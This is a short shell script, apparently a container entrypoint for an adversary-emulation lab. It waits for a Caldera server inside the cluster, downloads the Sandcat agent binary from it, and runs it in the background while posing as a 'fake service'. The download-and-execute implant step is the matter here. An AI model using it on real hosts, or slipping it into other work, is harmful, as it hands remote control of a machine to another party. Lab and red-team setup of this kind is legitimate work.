#!/bin/sh
set -e

CALDERA_URL="${CALDERA_URL:-http://caldera.web:8888}"
GROUP="${GROUP:-cluster}"

echo "[compromised] waiting for $CALDERA_URL ..."
# attende che il servizio Caldera (interno al cluster) risponda
until wget -qO- "$CALDERA_URL" >/dev/null 2>&1; do sleep 2; done
sleep 10

echo "[compromised] downloading sandcat payload..."
# scarica il BINARIO direttamente (non pipe-are in sh!)
# Nota: 'wget' di BusyBox è già presente in Alpine
wget -qO /tmp/sandcat "$CALDERA_URL/file/download" \
  --header='file:sandcat.go' \
  --header='platform:linux' \
  --header="server:${CALDERA_URL}" \
  --header="group:${GROUP}"

chmod +x /tmp/sandcat

echo "[compromised] starting sandcat agent..."
/tmp/sandcat &

echo "[compromised] fake service running"
while true; do sleep 3600; done